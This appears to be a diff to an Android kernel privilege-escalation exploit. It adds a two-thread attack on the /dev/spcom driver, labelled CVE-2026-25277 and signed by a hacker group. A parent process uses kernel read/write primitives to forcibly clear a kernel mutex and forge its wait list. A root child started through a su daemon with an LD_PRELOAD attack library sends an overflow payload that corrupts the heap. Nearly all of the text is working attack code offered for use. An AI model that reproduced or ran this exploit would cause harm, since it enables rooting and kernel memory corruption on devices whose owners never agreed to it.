@@ -462,6 +462,83 @@ static int install_workqueue_umh_root(int fd) {
     pr_info("spcom: mutex unlock rc=%d\n", unlock_rc);
   }
 
+  /* === CVE-2026-25277 TWO-THREAD OVERFLOW ATTACK ===
+   * Thread A (su_daemon child): Opens /dev/spcom, registers, sends first msg (BLOCKS)
+   * Thread B (constructor):     Sleeps 2s, zeros mutex via pipe_write64, waits
+   * Thread A unblocks:          Sends overflow payload (cmd=2, len=0x10000, 256 bytes)
+   * SPU:                        CopyParamData overflows → heap corruption
+   *
+   * JackKnife Studios | VIVA LA REVOLUTION */
+  if (socket_ok) {
+    /* Read channel address from unlock scan */
+    uintptr_t ch_addr = 0;
+    FILE *chf = fopen("/data/local/tmp/.spcom_channel", "r");
+    if (chf) {
+      char cbuf[64] = {0};
+      if (fgets(cbuf, sizeof(cbuf), chf))
+        ch_addr = strtoull(cbuf, NULL, 16);
+      fclose(chf);
+    }
+
+    if (ch_addr) {
+      uintptr_t mutex_addr = ch_addr + 0x20;  /* mutex.owner at channel+0x20 */
+      pr_info("overflow: channel=%016llx mutex=%016llx\n",
+              (unsigned long long)ch_addr, (unsigned long long)mutex_addr);
+
+      /* Fork: child does SEND via su_daemon, parent does mutex unlock */
+      pid_t atk = fork();
+
+      if (atk == 0) {
+        /* === CHILD: SEND THREAD (via su_daemon for uid=0) === */
+        execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
+          /* The overflow attack script */
+          "exec 2>/data/local/tmp/overflow_log.txt; set -x;"
+
+          /* Open spcom and register */
+          " LD_PRELOAD=/data/local/tmp/spcom_overflow_atk.so /system/bin/true"
+
+          , (char *)NULL);
+        _exit(1);
+      }
+
+      if (atk > 0) {
+        /* === PARENT: MUTEX UNLOCK THREAD === */
+        pr_info("overflow: child=%d launched, waiting 3s for it to block on mutex...\n", atk);
+        sleep(3);
+
+        /* Read current mutex state */
+        uint64_t owner = pipe_read64(fd, mutex_addr);
+        pr_info("overflow: mutex owner BEFORE unlock: %016llx\n", (unsigned long long)owner);
+
+        if (owner != 0) {
+          /* UNLOCK! Zero the mutex owner field */
+          pipe_write64(fd, mutex_addr, 0);
+          uint64_t verify = pipe_read64(fd, mutex_addr);
+          pr_info("overflow: mutex owner AFTER unlock: %016llx %s\n",
+                  (unsigned long long)verify,
+                  verify == 0 ? "UNLOCKED!" : "FAILED!");
+
+          /* Also zero the wait_lock and fix wait_list */
+          pipe_write64(fd, mutex_addr + 8, 0);  /* spinlock */
+          /* Make wait_list point to itself (empty list) */
+          pipe_write64(fd, mutex_addr + 0x10, mutex_addr + 0x10);  /* next = self */
+          pipe_write64(fd, mutex_addr + 0x18, mutex_addr + 0x10);  /* prev = self */
+
+          pr_info("overflow: mutex fully cleared! child should unblock NOW\n");
+        } else {
+          pr_info("overflow: mutex already unlocked (owner=0)\n");
+        }
+
+        /* Wait for child to finish */
+        int wst;
+        waitpid(atk, &wst, 0);
+        pr_info("overflow: child exit=%d\n", WIFEXITED(wst) ? WEXITSTATUS(wst) : -1);
+      }
+    } else {
+      pr_info("overflow: no channel address found (run unlock scan first)\n");
+    }
+  }
+
   /* === DEFEX NOTE ===
    * global_features_status at KIMAGE+0x172756c is RKP-PROTECTED.
    * Writing to it causes EL2 trap → kernel panic.
